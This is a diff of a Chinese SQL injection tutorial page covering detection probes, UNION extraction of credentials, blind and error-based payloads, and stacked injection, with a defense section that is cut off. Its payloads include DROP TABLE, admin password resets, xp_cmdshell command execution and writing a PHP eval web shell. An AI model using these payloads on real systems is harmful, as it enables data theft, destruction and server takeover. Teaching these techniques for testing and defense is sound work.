@@ -6,7 +6,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="SQL注入原理、联合查询、报错注入、布尔盲注、时间盲注、堆叠注入">
+        <meta name="description" content="SQL 注入漏洞的原理与危害、漏洞检测方法（可控位置/多场景/探测手法）、注入类型详解（联合查询/布尔盲注/报错注入/时间盲注/堆叠注入）、多数据库 payload 差异，以及预编译参数化等防御方案">
       
       
         <meta name="author" content="ethicalpaws">
@@ -25,7 +25,7 @@
     
     
       
-        <title>SQL注入漏洞 - 青春沙盒</title>
+        <title>SQL注入基础 - 青春沙盒</title>
       
     
     
@@ -116,7 +116,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              SQL注入漏洞
+              SQL注入基础
             
           </span>
         </div>
@@ -3116,18 +3116,7 @@
   <a href="#sql_2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        检测SQL注入漏洞
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        SQL注入示例
+        如何检测SQL注入漏洞
       
     </span>
   </a>
@@ -3136,17 +3125,6 @@
       
         <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        检查数据库
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
         注入类型
@@ -3158,7 +3136,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
+  <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
         联合查询
@@ -3169,16 +3147,15 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#sql_4" class="md-nav__link">
+  <a href="#_3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        SQL盲注
+        布尔盲注
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="SQL盲注">
-      <ul class="md-nav__list">
+</li>
         
           <li class="md-nav__item">
   <a href="#_4" class="md-nav__link">
@@ -3189,13 +3166,14 @@
     </span>
   </a>
   
-</li>
+    <nav class="md-nav" aria-label="报错注入">
+      <ul class="md-nav__list">
         
           <li class="md-nav__item">
   <a href="#_5" class="md-nav__link">
     <span class="md-ellipsis">
       
-        时间盲注
+        常用函数：
       
     </span>
   </a>
@@ -3211,6 +3189,17 @@
   <a href="#_6" class="md-nav__link">
     <span class="md-ellipsis">
       
+        时间盲注
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
         堆叠注入
       
     </span>
@@ -3224,21 +3213,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#sql_5" class="md-nav__link">
+  <a href="#sql_3" class="md-nav__link">
     <span class="md-ellipsis">
       
         如何防止SQL注入
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sqlcheat-sheet" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        SQL注入cheat sheet
       
     </span>
   </a>
@@ -3265,11 +3243,12 @@
   
 
 
-  <h1>SQL注入漏洞</h1>
+  <h1>SQL注入基础</h1>
 
 <h2 id="sql">什么是SQL注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
 <p>SQL注入（SQLi）是一种Web安全漏洞，它允许攻击者干扰应用程序向其数据库发送的查询。这使得攻击者能够查看其本无权访问的数据，例如其他用户的数据，或应用程序所能访问的任何其他数据。在许多情况下，攻击者还可修改或删除这些数据，从而对应用程序的内容或行为造成持久性影响。
 在某些情况下，攻击者可将SQL注入攻击升级，以危害底层服务器或其他后端基础设施，甚至可借此发动拒绝服务攻击。    </p>
+<p><strong>原理：</strong>用户输入未经过滤直接拼接到 SQL 语句中执行，攻击者通过构造恶意输入改变查询逻辑，获取数据或执行系统命令。</p>
 <h2 id="sql_1">SQL注入的影响<a class="headerlink" href="#sql_1" title="Permanent link">&para;</a></h2>
 <ol>
 <li>泄露库信息
@@ -3277,52 +3256,446 @@
 • 密码；<br />
 • 信用卡详细信息；<br />
 • 用户个人身份信息。</li>
-<li>获得持久性后门访问权限</li>
+<li>绕过认证</li>
+<li>万能密码：<code>' or '1'='1</code> </li>
+<li>
+<p>执行命令获得持久性后门访问权限
+   <strong>条件：</strong> </p>
+<ul>
+<li>数据库账号有FILE权限，可以LOAD_FILe读文件、INTO OUTFILE写文件</li>
+<li>支持堆叠查询+高权限→ 可执行系统命令（MySQL UDF 提权、MSSQL xp_cmdshell、PostgreSQL COPY ... PROGRAM）</li>
+<li>数据库与应用同机、web 目录可写 → 写马直接 getshell。</li>
+</ul>
+</li>
+<li>
+<p>拒绝服务</p>
+</li>
+<li>SELECT BENCHMARK(100000000,SHA1('x')) 拖垮数据库。</li>
+<li>横向移动</li>
+<li>以 DB 服务器为跳板，访问内网其它主机。</li>
 </ol>
-<h2 id="sql_2">检测SQL注入漏洞<a class="headerlink" href="#sql_2" title="Permanent link">&para;</a></h2>
+<h2 id="sql_2">如何检测SQL注入漏洞<a class="headerlink" href="#sql_2" title="Permanent link">&para;</a></h2>
 <ol>
-<li>在查询的不同部分</li>
-<li>在不同场景下</li>
+<li>在查询的不同部分
+凡是用户可控且进入 SQL 的位置都要测：</li>
 </ol>
-<h2 id="sql_3">SQL注入示例<a class="headerlink" href="#sql_3" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WHERE 条件</td>
+<td><code>?id=1</code></td>
+</tr>
+<tr>
+<td>ORDER BY 排序字段</td>
+<td><code>?sort=name</code></td>
+</tr>
+<tr>
+<td>LIMIT 分页</td>
+<td><code>?limit=10</code></td>
+</tr>
+<tr>
+<td>INSERT 的值</td>
+<td>注册、评论</td>
+</tr>
+<tr>
+<td>UPDATE 的值</td>
+<td>改资料</td>
+</tr>
+<tr>
+<td>表名 / 列名</td>
+<td><code>?table=users</code></td>
+</tr>
+<tr>
+<td>Cookie / Header</td>
+<td><code>User-Agent</code>、<code>X-Forwarded-For</code></td>
+</tr>
+<tr>
+<td>二级注入</td>
+<td>数据入库后再被查询（存储型）</td>
+</tr>
+</tbody>
+</table>
 <ol>
-<li>获取隐藏数据</li>
-<li>破坏应用程序逻辑</li>
-<li>联合查询</li>
-<li>盲注</li>
+<li>
+<p>在不同场景下</p>
+</li>
+<li>
+<p>GET / POST / Cookie / JSON / XML / GraphQL 参数。</p>
+</li>
+<li>
+<p>编码差异：URL 编码、Base64、Unicode、双重编码。</p>
+</li>
+<li>
+<p>字符集问题：GBK 宽字节注入（%df%27）。</p>
+</li>
+<li>
+<p>框架特性：MyBatis ${}、ORM 的 raw()。</p>
+</li>
+<li>
+<p>盲注场景：无回显、无报错，只能靠布尔/时间判断。</p>
+</li>
+<li>
+<p>常用探测手法
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="s1">&#39;                 -- 是否报错</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="s1">&#39;&#39;                -- 是否恢复</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="s1">1&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1    -- 恒真，看页面是否正常</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="s1">1&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;2    -- 恒假，看页面是否异常</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="s1">1 AND SLEEP(5)   -- 时间盲注</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="s1">1&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="c1">--   -- 联合查询探测</span>
+</span></code></pre></div></p>
+</li>
 </ol>
-<h2 id="_1">检查数据库<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><strong>判断依据</strong>：</p>
+<ul>
+<li>
+<p>报错信息变化 → 报错注入可能。</p>
+</li>
+<li>
+<p>页面内容/状态码变化 → 布尔盲注。</p>
+</li>
+<li>
+<p>响应时间变化 → 时间盲注。</p>
+</li>
+</ul>
+<h2 id="_1">注入类型<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="_2">联合查询<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>前提：页面有回显位，且原查询与 UNION 查询列数、类型兼容
+1. 确定所需的列数
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a> &#39; ORDER BY 1-- 
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a> &#39; ORDER BY 2-- 
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a> &#39; ORDER BY 3--    ← 报错说明有 2 列
+</span></code></pre></div>
+2. 数据库特定的闭合语法</p>
+</blockquote>
+<div class="language-text highlight"><pre><span></span><code>| 数据库 | 注释 | 字符串 |
+|--------|------|--------|
+| MySQL | `--`（后跟空格）、`#` | `&#39;` `&quot;` |
+| MSSQL | `--`、`/* */` | `&#39;` |
+| Oracle | `--` | `&#39;` |
+| PostgreSQL | `--`、`/* */` | `&#39;` |
+
+**示例：**
+```
+?id=1&#39;--
+?id=1&#39;)--
+?id=1&quot;))--
+```
+</code></pre></div>
 <ol>
-<li>查询数据库类型和版本</li>
-<li>列出数据库的内容</li>
+<li>查找具有有用数据类型的列
+   把回显位换成字符串，看哪列能显示：
+   <code>' UNION SELECT 1,'a',3--</code> </li>
+<li>利用SQL注入联合攻击检索数据
+   <code>-- 当前库、用户、版本
+    ' UNION SELECT 1,database(),user()-- 
+    ' UNION SELECT 1,version(),@@datadir-- 
+
+    -- 爆表
+    ' UNION SELECT 1,group_concat(table_name),3 
+    FROM information_schema.tables 
+    WHERE table_schema=database()-- 
+
+    -- 爆列
+    ' UNION SELECT 1,group_concat(column_name),3 
+    FROM information_schema.columns 
+    WHERE table_name='users'-- 
+
+    -- 爆数据
+    ' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--</code> </li>
+<li>在单列中检索多个值
+   用 group_concat()（MySQL）、string_agg()（PG）、FOR XML PATH（MSSQL）把多行拼到一列：
+   <code>' UNION SELECT 1,group_concat(username,0x3a,password SEPARATOR '&lt;br&gt;'),3 FROM users--</code> </li>
 </ol>
-<h2 id="_2">注入类型<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<h3 id="_3">联合查询<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<h3 id="_3">布尔盲注<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>页面不报错、不回显，但真/假条件导致页面内容或状态不同。</p>
+</blockquote>
+<p><strong>核心 payload：</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&#39; AND SUBSTRING(database(),1,1)=&#39;a&#39;-- 
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>&#39; AND ASCII(SUBSTRING((SELECT database()),1,1))&gt;97-- 
+</span></code></pre></div>
+<strong>逐字符爆破：</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>-- 判断库名长度
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>&#39; AND LENGTH(database())=5-- 
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>-- 逐位判断
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>&#39; AND ASCII(SUBSTRING(database(),1,1))=115--   -- &#39;s&#39;
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>&#39; AND ASCII(SUBSTRING(database(),2,1))=101--   -- &#39;e&#39;
+</span></code></pre></div></p>
+<p><strong>自动化</strong>： sqlmap、Burp Intruder。</p>
+<p><strong>特点</strong>： 请求量大、慢，但隐蔽。</p>
+<h3 id="_4">报错注入<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>利用数据库把查询结果"塞进报错信息"里回显。</p>
+</blockquote>
+<p><strong>核心payload：</strong></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>SELECT 1 FROM (
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    SELECT COUNT(*), CONCAT( (SELECT database()), FLOOR(RAND(0)*2) ) x
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    FROM information_schema.tables
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    GROUP BY x
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>) a
+</span></code></pre></div>
+<strong>逐层解释：</strong></p>
+<ul>
+<li>SELECT database()
+取当前数据库名，比如 security。这是我们要偷的数据。</li>
+<li>FLOOR(RAND(0)*2)：</li>
+<li>RAND(0)：以 0 为种子生成伪随机数。种子固定 → 序列固定。</li>
+<li>RAND(0)*2：把 [0,1) 放大到 [0,2)。</li>
+<li>
+<p>FLOOR(...)：向下取整 → 结果只能是 0 或 1。</p>
+</li>
+<li>
+<p>重点： RAND(0) 的序列是可复现的，具体是：
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>第1次: 0.155...  → *2=0.31 → floor=0
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>第2次: 0.899...  → *2=1.79 → floor=1
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>第3次: 0.788...  → *2=1.57 → floor=1
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>第4次: 0.155...  → 又回到 0
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>...
+</span></code></pre></div>
+    即 FLOOR(RAND(0)*2) 会稳定产生 0,1,1,... 这种重复序列。</p>
+</li>
+<li>
+<p>CONCAT(database(), FLOOR(RAND(0)*2))
+    把库名和上面那个 0/1 拼起来：
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>security0
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>security1
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>security1
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>security0
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>...
+</span></code></pre></div></p>
+</li>
+<li>
+<p>GROUP BY x</p>
+<ul>
+<li>
+<p>x 是子查询的别名，代表 CONCAT(...) 那一列。GROUP BY x 会按这一列分组。</p>
+</li>
+<li>
+<p>问题来了： 在 MySQL 里，GROUP BY 时如果 SELECT 的列既不在 GROUP BY 里、又不是聚合函数，且值在组内不唯一，就会触发：
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>ERROR 1242 (21000): Subquery returns more than 1 row    
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>或者更常见的：
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>ERROR 1062 (23000): Duplicate entry &#39;security1&#39; for key &#39;group_key&#39;
+</span></code></pre></div></p>
+</li>
+<li>
+<p>为什么？ 因为 CONCAT(database(), FLOOR(RAND(0)*2)) 的值在分组过程中会变化（0 变 1，1 又变 0），MySQL 认为同一组里出现了不同的"键"，于是报"重复键"错误——而错误信息里就带着 security1 这个值。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>外层 SELECT 1 FROM (...) a
+只是套一层派生表，让语法合法。真正的"内容"在错误信息里。</p>
+</li>
+</ul>
+<p><strong>优势：</strong></p>
+<ul>
+<li>
+<p>不依赖页面回显位（不像 UNION 需要列数匹配）。</p>
+</li>
+<li>
+<p>不依赖布尔差异（不像布尔盲注要反复猜）。</p>
+</li>
+<li>
+<p>直接把数据塞进数据库报错信息，一次请求拿一截数据。</p>
+</li>
+</ul>
+<p><strong>几个容易混淆的点</strong></p>
+<table>
+<thead>
+<tr>
+<th>疑问</th>
+<th>解答</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>为什么必须 <code>RAND(0)</code> 固定种子？</td>
+<td>不固定种子，序列不可复现，<code>GROUP BY</code> 不会稳定报错。</td>
+</tr>
+<tr>
+<td>为什么能报"重复键"？</td>
+<td>分组键在组内值不稳定，MySQL 判定冲突。</td>
+</tr>
+<tr>
+<td>为什么只显示一截？</td>
+<td>报错信息长度有限（约 32 字节），需配合 <code>SUBSTRING</code> 分段。</td>
+</tr>
+<tr>
+<td>MySQL 8 还能用吗？</td>
+<td><code>group_key</code> 相关行为有变化，常改用 <code>extractvalue</code> / <code>updatexml</code>。</td>
+</tr>
+</tbody>
+</table>
+<h4 id="_5">常用函数：<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>mysql
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>  -- extractvalue（XPath 报错，最多 32 字符）
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  &#39; AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- 
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>  -- updatexml
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>  &#39; AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- 
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>  -- floor + rand + group by
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>  &#39; AND (SELECT 2 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x 
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>  FROM information_schema.tables GROUP BY x)a)-- 
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>  -- exp 溢出（MySQL 5.5+）
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>  &#39; AND exp(~(SELECT * FROM (SELECT database())a))-- 
+</span></code></pre></div></p>
+</li>
+<li>
+<p>MSSQL：
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>  &#39; AND 1=CONVERT(int,(SELECT @@version))-- 
+</span></code></pre></div></p>
+</li>
+<li>
+<p>Oracle：
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>  &#39; AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--
+</span></code></pre></div></p>
+</li>
+</ul>
+<h3 id="_6">时间盲注<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>页面无回显、无报错、布尔也判断不了时，用响应时间判断真假</p>
+</blockquote>
+<ul>
+<li>
+<p>MySQL：</p>
+<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="s1">&#39; AND SLEEP(5)-- </span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">IF</span><span class="p">(</span><span class="k">SUBSTRING</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="c1">-- </span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="s1">&#39; AND BENCHMARK(5000000,SHA1(&#39;</span><span class="n">x</span><span class="err">&#39;</span><span class="p">))</span><span class="c1">-- </span>
+</span></code></pre></div>
+-MSSQL：</p>
+<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="s1">&#39;; WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">5</span><span class="err">&#39;</span><span class="c1">-- </span>
+</span></code></pre></div>
+- PostgreSQL：</p>
+<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="err">&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="c1">-- </span>
+</span></code></pre></div>
+- Oracle：</p>
+<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="s1">&#39; AND 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND </span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="s1">dbms_pipe.receive_message(&#39;</span><span class="n">a</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="c1">-- </span>
+</span></code></pre></div>
+1. 利用时间延迟触发</p>
+</li>
+</ul>
+<p><div class="language-sql highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1">-- 判断库名第一位是否为 &#39;s&#39;</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">IF</span><span class="p">(</span><span class="n">ASCII</span><span class="p">(</span><span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">115</span><span class="p">,</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="c1">-- </span>
+</span></code></pre></div>
+<strong>逐字符爆破逻辑</strong>：</p>
 <ol>
-<li>确定所需的列数</li>
-<li>数据库特定的闭合语法</li>
-<li>查找具有有用数据类型的列</li>
-<li>利用SQL注入联合攻击检索数据</li>
-<li>在单列中检索多个值</li>
+<li>二分法猜 ASCII 值。</li>
+<li>每次命中 → 延迟 3~5 秒。</li>
+<li>脚本记录耗时，还原数据。</li>
 </ol>
-<h3 id="sql_4">SQL盲注<a class="headerlink" href="#sql_4" title="Permanent link">&para;</a></h3>
+<p><strong>注意</strong>：</p>
+<ul>
+<li>
+<p>网络抖动会造成误判，建议延迟 ≥3s、多次取样。</p>
+</li>
+<li>
+<p>高并发下可能被 WAF 的速率限制拦住。</p>
+</li>
+</ul>
+<h3 id="_7">堆叠注入<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>用 ; 分隔，一次请求执行多条 SQL。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>数据库 / 驱动</th>
+<th>是否支持</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL + PHP mysqli（multi_query）</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>MySQL + PDO（默认）</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>❌</td>
+</tr>
+</tbody>
+</table>
+<p><strong>payload：</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>&#39;; DROP TABLE users-- 
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>&#39;; INSERT INTO users(username,password) VALUES(&#39;hacker&#39;,&#39;123&#39;)-- 
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>&#39;; UPDATE users SET password=&#39;x&#39; WHERE username=&#39;admin&#39;-- 
+</span></code></pre></div></p>
+<p><strong>MSSQL 提权：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="s1">&#39;; EXEC sp_configure &#39;</span><span class="k">show</span><span class="w"> </span><span class="n">advanced</span><span class="w"> </span><span class="k">options</span><span class="s1">&#39;,1; RECONFIGURE;-- </span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="s1">&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="p">;</span><span class="c1">-- </span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="s1">&#39;; EXEC xp_cmdshell &#39;</span><span class="n">whoami</span><span class="err">&#39;</span><span class="c1">-- </span>
+</span></code></pre></div>
+<p><strong>MySQL 写马（需 FILE 权限 + secure_file_priv 允许）：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="s1">&#39; UNION SELECT &quot;&lt;?php @eval($_POST[&#39;</span><span class="n">x</span><span class="s1">&#39;]);?&gt;&quot; INTO OUTFILE &#39;</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="err">&#39;</span><span class="c1">-- </span>
+</span></code></pre></div>
+<p><strong>特点</strong>： 危害最大，可直接改数据、写文件、执行命令。</p>
+<h2 id="sql_3">如何防止SQL注入<a class="headerlink" href="#sql_3" title="Permanent link">&para;</a></h2>
 <ol>
-<li>什么是SQL盲注？</li>
-<li>利用盲注SQL注入触发条件响应</li>
-<li>利用带外（OAST）技术进行SQL盲注</li>
+<li>根本方案：预编译参数化查询<ul>
